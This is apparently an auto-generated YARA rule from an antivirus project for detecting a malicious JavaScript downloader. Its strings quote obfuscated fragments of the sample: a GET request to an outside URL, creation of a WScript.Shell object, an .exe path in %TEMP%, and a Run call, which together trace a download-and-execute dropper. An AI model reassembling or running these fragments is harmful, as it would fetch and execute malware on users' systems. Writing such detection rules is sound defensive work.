rule sig_20160401_c797783adc00bd5f54957496334b8705 {
  meta:
    description = "datamaliciousorder - file 20160401_c797783adc00bd5f54957496334b8705.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "33df9884f2e95b411ec776ff129006752c471253ad58f2d6a7aabbab5667b776"

  strings:
    $s1  = "EcwBnb[OnEl](\"G\" + \"ET\", \"http://echo-gs.net/h6dskl\", false);" fullword ascii
    $s2  = "function MeVmz(QqmVv, WsaJja){JeeEyk = JeeEyk * 1; return QqmVv - WsaJja;};" fullword ascii
    $s3  = "var MgzUdl = function CqZto() {return WScript[IvpVs](\"WScript\"+\".Shell\");}(), DeZkz = 11;" fullword ascii
    $s4  = "if (EcwBnb[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "var ReCt = CrFwe[\"getUTCMilliseconds\"]();" fullword ascii
    $s6  = "function KkbLc(){return AkTr + \"\";};" fullword ascii
    $s7  = "function ZezYzm() {return MgzUdl[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"c7lIJAy6n.ex\" + \"e\";};" fullword ascii
    $s8  = "function VwFz() {return ((MlsWah == true) && (MlsWah == YoaLu)) ? 1 : JeeEyk;};" fullword ascii
    $s9  = "var YoaLu = false;" fullword ascii
    $s10 = "function KgeVd(VrgLzp){MgzUdl[\"R\"+\"un\"](VrgLzp, JeeEyk, JeeEyk);};" fullword ascii
    $s11 = "function RgJcl(){return IvpVs;};" fullword ascii
    $s12 = "WaAl = MeVmz(ReCt, UsVq);" fullword ascii
    $s13 = "YoaLu = true; " fullword ascii
    $s14 = "var CrFwe = new this[\"Date\"]();" fullword ascii
    $s15 = "MlsWah = true; " fullword ascii
    $s16 = "var MlsWah = false;" fullword ascii
    $s17 = "function WzNr()" fullword ascii
    $s18 = "function BvSod(WmvRv) {var IdyPdx = (1, 2, 3, 4, 5, WmvRv); return IdyPdx;};" fullword ascii
    $s19 = "}while (QiuQqv);" fullword ascii
    $s20 = "var GwUyl = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}